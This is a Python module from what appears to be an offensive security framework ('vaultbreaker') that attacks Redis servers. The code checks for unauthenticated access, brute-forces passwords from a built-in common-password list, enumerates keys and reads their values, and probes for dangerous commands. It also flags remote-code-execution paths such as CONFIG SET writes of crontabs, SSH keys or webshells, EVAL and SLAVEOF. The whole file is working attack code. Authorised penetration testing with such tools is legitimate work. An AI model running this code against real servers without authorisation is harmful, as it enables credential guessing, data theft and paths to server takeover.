"""Redis exploitation -- unauthenticated access, brute-force, RCE via CONFIG SET."""
from __future__ import annotations

import re
from typing import Optional

from vaultbreaker.models import AttackResult, Credential, EngagementContext
from vaultbreaker.logger import info, ok, warn, crit, section, console
from vaultbreaker.modules.base import BaseModule
from vaultbreaker.data import tcp_connect, send_recv


class RedisModule(BaseModule):
    """Redis exploitation -- unauthenticated access, brute-force, RCE via CONFIG SET."""

    name = "redis"

    COMMON_PASSWORDS = [
        "", "redis", "password", "admin", "root", "default", "123456",
        "redis123", "pass", "test", "guest", "changeme", "letmein",
        "master", "secret", "redis_password", "redispass",
    ]

    def run(self, ctx: EngagementContext) -> None:
        section("Redis Module")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            port = 6379
            for p in ctx.ports:
                if p in (6379, 6380):
                    port = p
                    break
            info(f"Target: {host}:{port}")
            authed = self._unauth_check(ctx, host, port)
            if not authed:
                authed = self._auth_bruteforce(ctx, host, port)
            if authed:
                self._server_info(ctx, host, port, authed)
                self._key_enumeration(ctx, host, port, authed)
                self._dangerous_commands(ctx, host, port, authed)
                self._rce_vectors(ctx, host, port, authed)

    def _redis_cmd(self, host: str, port: int, cmd: str, password: str = "",
                   timeout: int = 5) -> Optional[object]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(host=host, port=port, password=password or None,
                                socket_timeout=timeout, decode_responses=True)
            if cmd.upper() == "INFO":
                return r.info()
            elif cmd.upper() == "DBSIZE":
                return str(r.dbsize())
            elif cmd.upper().startswith("KEYS"):
                pattern = cmd.split(None, 1)[1] if " " in cmd else "*"
                return r.keys(pattern)
            elif cmd.upper() == "CONFIG GET *":
                return r.config_get("*")
            else:
                return r.execute_command(*cmd.split())
        except Exception:
            return None

    def _unauth_check(self, ctx: EngagementContext, host: str, port: int) -> str:
        sock = tcp_connect(host, port, ctx.timeout)
        if not sock:
            ctx.add_result(AttackResult("redis", "Connection", "fail", "info",
                                        f"Cannot connect to {host}:{port}"))
            return ""
        resp = send_recv(sock, b"INFO\r\n", ctx.timeout)
        sock.close()
        decoded = resp.decode("utf-8", errors="ignore")
        if "redis_version" in decoded:
            version_match = re.search(r"redis_version:(\S+)", decoded)
            version = version_match.group(1) if version_match else "unknown"
            ctx.add_result(AttackResult(
                "redis", "Unauthenticated Access", "critical", "critical",
                f"Redis {version} accessible without authentication"
            ))
            return "NO_AUTH"
        elif "NOAUTH" in decoded or "Authentication required" in decoded.lower():
            ctx.add_result(AttackResult("redis", "Unauthenticated Access", "ok", "info",
                                        "Authentication required"))
        return ""

    def _auth_bruteforce(self, ctx: EngagementContext, host: str, port: int) -> str:
        ctx.add_result(AttackResult("redis", "AUTH Brute-Force", "ok", "info",
                                    f"Testing {len(self.COMMON_PASSWORDS)} common passwords"))
        for pwd in self.COMMON_PASSWORDS:
            if not pwd:
                continue
            sock = tcp_connect(host, port, ctx.timeout)
            if not sock:
                continue
            resp = send_recv(sock, f"AUTH {pwd}\r\n".encode(), ctx.timeout)
            sock.close()
            decoded = resp.decode("utf-8", errors="ignore")
            if "+OK" in decoded:
                ctx.add_result(AttackResult(
                    "redis", "AUTH Brute-Force", "critical", "critical",
                    f"Password found: {pwd}"
                ))
                ctx.add_credential(Credential("redis-bruteforce", "", pwd, "", host, port))
                return pwd
        ctx.add_result(AttackResult("redis", "AUTH Brute-Force", "fail", "info",
                                    "No common passwords worked"))
        return ""

    def _server_info(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        try:
            import redis as redis_lib
            r = redis_lib.Redis(host=host, port=port, password=auth or None,
                                socket_timeout=ctx.timeout, decode_responses=True)
            info_data = r.info()
            ctx.add_result(AttackResult(
                "redis", "Server Info", "ok", "medium",
                f"version={info_data.get('redis_version', '?')}, "
                f"os={info_data.get('os', '?')}, "
                f"clients={info_data.get('connected_clients', '?')}, "
                f"memory={info_data.get('used_memory_human', '?')}, "
                f"keys={sum(info_data.get(f'db{i}', {}).get('keys', 0) for i in range(16))}"
            ))
            r.close()
        except ImportError:
            sock = tcp_connect(host, port, ctx.timeout)
            if sock:
                if auth:
                    send_recv(sock, f"AUTH {auth}\r\n".encode(), ctx.timeout)
                resp = send_recv(sock, b"INFO\r\n", ctx.timeout)
                sock.close()
                if resp:
                    ctx.add_result(AttackResult("redis", "Server Info", "ok", "medium",
                                                f"Raw INFO received ({len(resp)} bytes)"))

    def _key_enumeration(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        try:
            import redis as redis_lib
            r = redis_lib.Redis(host=host, port=port, password=auth or None,
                                socket_timeout=ctx.timeout, decode_responses=True)
            keys = []
            cursor = 0
            while True:
                cursor, batch = r.scan(cursor=cursor, count=100)
                keys.extend(batch)
                if cursor == 0 or len(keys) >= 500:
                    break
            if keys:
                ctx.add_result(AttackResult(
                    "redis", "Key Enumeration", "ok", "high",
                    f"Found {len(keys)} keys (sample): {', '.join(keys[:20])}"
                ))
                for key in keys[:10]:
                    try:
                        key_type = r.type(key)
                        if key_type == "string":
                            val = r.get(key)
                            preview = str(val)[:100] if val else ""
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [string] = {preview}"
                            ))
                        elif key_type == "hash":
                            val = r.hgetall(key)
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [hash] fields={list(val.keys())[:10]}"
                            ))
                        elif key_type == "list":
                            length = r.llen(key)
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [list] length={length}"
                            ))
                        elif key_type == "set":
                            members = r.smembers(key)
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [set] members={len(members)}"
                            ))
                    except Exception:
                        pass
            else:
                ctx.add_result(AttackResult("redis", "Key Enumeration", "ok", "info",
                                            "No keys found in default database"))
            r.close()
        except ImportError:
            ctx.add_result(AttackResult("redis", "Key Enumeration", "fail", "info",
                                        "redis library not installed for enumeration"))

    def _dangerous_commands(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        dangerous = ["CONFIG", "DEBUG", "EVAL", "SCRIPT", "SLAVEOF", "REPLICAOF", "MODULE"]
        available = []
        sock = tcp_connect(host, port, ctx.timeout)
        if not sock:
            return
        if auth:
            send_recv(sock, f"AUTH {auth}\r\n".encode(), ctx.timeout)
        for cmd in dangerous:
            resp = send_recv(sock, f"COMMAND INFO {cmd}\r\n".encode(), ctx.timeout)
            decoded = resp.decode("utf-8", errors="ignore")
            if "ERR" not in decoded and "unknown" not in decoded.lower():
                available.append(cmd)
        sock.close()
        if available:
            ctx.add_result(AttackResult(
                "redis", "Dangerous Commands", "critical", "high",
                f"Available dangerous commands: {', '.join(available)}"
            ))
        else:
            ctx.add_result(AttackResult("redis", "Dangerous Commands", "ok", "info",
                                        "Dangerous commands appear restricted"))

    def _rce_vectors(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        vectors = []
        sock = tcp_connect(host, port, ctx.timeout)
        if not sock:
            return
        if auth:
            send_recv(sock, f"AUTH {auth}\r\n".encode(), ctx.timeout)
        # Check CONFIG SET capability
        resp = send_recv(sock, b"CONFIG GET dir\r\n", ctx.timeout)
        decoded = resp.decode("utf-8", errors="ignore")
        if "dir" in decoded.lower() and "ERR" not in decoded:
            vectors.append("CONFIG SET (crontab/SSH key/webshell write)")
        # Check EVAL (Lua)
        resp = send_recv(sock, b'EVAL "return 1+1" 0\r\n', ctx.timeout)
        decoded = resp.decode("utf-8", errors="ignore")
        if ":2" in decoded or "2" in decoded:
            vectors.append("EVAL (Lua script execution)")
        # Check SLAVEOF
        resp = send_recv(sock, b"COMMAND INFO SLAVEOF\r\n", ctx.timeout)
        decoded = resp.decode("utf-8", errors="ignore")
        if "ERR" not in decoded:
            vectors.append("SLAVEOF (replication attack)")
        sock.close()
        if vectors:
            ctx.add_result(AttackResult(
                "redis", "RCE Vectors", "critical", "critical",
                f"Available RCE paths: {'; '.join(vectors)}"
            ))
        else:
            ctx.add_result(AttackResult("redis", "RCE Vectors", "ok", "info",
                                        "No obvious RCE vectors available"))
